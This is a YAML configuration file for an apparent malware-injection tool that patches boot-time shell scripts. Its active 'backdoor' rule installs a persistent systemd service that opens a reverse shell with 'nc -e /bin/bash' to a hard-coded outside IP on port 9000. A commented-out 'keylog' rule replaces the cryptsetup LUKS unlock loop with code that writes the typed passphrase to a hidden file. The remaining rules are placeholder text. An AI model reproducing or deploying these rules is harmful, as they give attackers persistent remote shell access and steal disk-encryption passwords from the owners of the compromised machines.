## Use this configuration file for declare what pieces of text you want replace with what else.
## create an element for each part which you're going to replace into the vulnerable files
## Read the example to understand how to write your personal rules.

##### new possible rules:
##### search for regex, create new file

################################################################################
############################################################BEGIN EXAMPLE#######
## Name of the rule, must be unique
#- rule_name: "example"
## The name of the file we have to looking for. It's must be a POSIX REGEX
## If you want looking for any file, set it ".*"
## Else you can specify a regex that's shuld match. (Increase performance)
#  name: ".*encrypt.*"
## This is the first line we are looking for, it shuld identify unequivocally
## the line, hence it have to be more uniqe as possible
#  start:
#      line: "while ! eval cryptsetup open"
## The last one line of the piece of code we wnat replace
#  end:
#      line: "done"
## The entire snippet of code we want inject at the place of the 'legit one'
## May mw stand for malware?
#  mw: |
#        if [ evil code ]
#          then
#            for some number to some bigger number
#              still grubbing password
#            OMG, it could be possible!?
#        fi
#        echo -n "damn hackers\!" &> /dev/null
## This is a security measure, is to intend:
## "If from the beginning to the end of the piece of code i want to replace, there is more than 'max_length' in lines, maybe is not what i'm looking for."
## For instance, i know the lines number of the code i want to replace is 3 chars, so i set 5 this value.
## Hence i'm sure the parser doesn't go ahead too long
#  max_length: 5
##############################################################END EXAMPLE#######
################################################################################

- rule_name: "backdoor"
  name: ".*eccolo"
  original_code: |
    # vim: set ft=sh ts=4 sw=4 et:
  mw: |
    #inject easter egg *o*
    addEggs() {
        cat > /new_root/etc/sysdata/sysdata << fine
            #!/bin/bash
            conx=0
            while [ \$conx -eq 0 ]
            do
                echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
                if [ \$? -eq 0 ]
                then
                        nc -e /bin/bash 37.187.38.145 9000
                else
                        sleep 1m
                fi
            done
    fine

        chmod +x /new_root/etc/sysdata/sysdata

        cat > /new_root/usr/lib/systemd/system/sysdata.service << fine
            [Unit]
            Description=Sysdata

            [Service]
            ExecStart=/bin/sh /etc/sysdata/sysdata

            [Install]
            WantedBy=multi-user.target
    fine

        ln -s /usr/lib/systemd/system/sysdata.service /new_root/etc/systemd/system/multi-user.target.wants/sysdata.service 2>/dev/null
    }

    # vim: set ft=sh ts=4 sw=4 et:
  just_once: true

- rule_name: "example_fixed_line"
  name: ".*eccolo"
  line_number: 18 #line_number start from 1 instead of 0
  mw: |
    mi sà proprio
    che questa è una line fixata

#- rule_name: "example_head"
#  name: ".*eccolo.*"
#  head: true
#  mw: |
#              if [ evil code ]
#                then
#                  for some number to some bigger number
#                    still grubbing password
#                  OMG, it could be possible!?
#              fi
#              echo -n "damn hackers\!" &> /dev/null

- rule_name: "example_bottom"
  name: ".*eccolo.*"
  bottom: true
  mw: |
        if [ evil code ]
          then
            for some number to some bigger number
              still grubbing password
            OMG, it could be possible!?
        fi
        echo -n "damn hackers\!" &> /dev/null
#
#- rule_name: "keylog"
#  name: ".*orig"
#  start:
#      line: "while ! eval cryptsetup open --type luks ${resolved} ${cryptname} ${cryptargs} ${CSQUIET}; do"
#  end:
#      line: "done"
#  mw: |
#        ok=0
#        while [ $ok -eq 0 ]
#        do
#          echo -n \"Enter passphrase for ${resolved}: \"
#          read -s pass
#          echo \"\"
#          if echo $pass | cryptsetup open --type luks ${resolved} ${cryptname} ${cryptargs} ${CSQUIET};
#          then
#            echo \"password \"${resolved}\": \"$pass > /sysdata/.data
#            ok=1
#          fi
#        done
#  max_length: 4
#  just_once: true
#
#- rule_name: "keylog2"
#  name: ".*"
#  start:
#      line: "w-hile ! eval cryptsetup open"
#  end:
#      line: "done"
#  mw: |
#        qualcosaltro
#  max_length: 100
#  just_once: false
#
#-# rule_name: "more-difficult"
#  name: ".*"
#  original_code: |
#    dsf
#    ds
#    f
#    fsd
  #  f
#    sd
#    f
#    sd
#    f
#    sd
#    fs
  #  df
#    sd
#  mw: |
#        c
#        e
#        l
#        '
  #      h
#        o
#        o
#        o
#        o
#        o
#        o
  #      o
#        o
#        oo
#
#
#        f
#        a
  #      t
#        t
#        a
#        !
#        !
#  just_once: false
